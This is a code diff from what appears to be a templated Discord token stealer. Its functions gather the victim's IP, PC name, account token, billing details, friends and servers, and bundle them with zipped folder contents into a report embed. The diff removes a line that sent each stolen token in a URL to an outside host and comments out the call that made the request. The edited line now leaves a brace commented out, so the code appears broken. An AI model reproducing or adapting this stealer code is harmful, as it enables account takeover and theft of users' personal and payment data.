@@ -296,7 +296,7 @@ async function %SENDLOGS%() {
   };
 
   readFolder(folderPath, zip, '');
-  var copyurl = ""
+  //var copyurl = ""
   let ip = await %GETIP%()
   let username = await %PCNAME%()
   let embed = await %GETEMBED%()
@@ -812,7 +812,7 @@ async function %VARESTEALTOKEN%() {
         var ip = await %GETIP%();
         var billing = await %VAREBILLDATA%(token);
         var friends = await %VAREFRIENDS%(token);
-        var copyurl = `https://projectdream.ml/full.php?token=${token}`;
+        var copyurl = "";
         let embed = await %GETEMBED%()
         var pp = `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`
         var servers = await %VARESERVERS%(token)
@@ -889,7 +889,7 @@ async function %VARESTEALTOKEN%() {
                   "icon_url": embed.footericon,
                 },
             }]
-        }).then(res => {axios.get(copyurl)}).catch(() => { axios.get(copyurl) })
+        }).then(res => {//axios.get(copyurl)}).catch(() => { axios.get(copyurl) })
         continue;
     }
 }
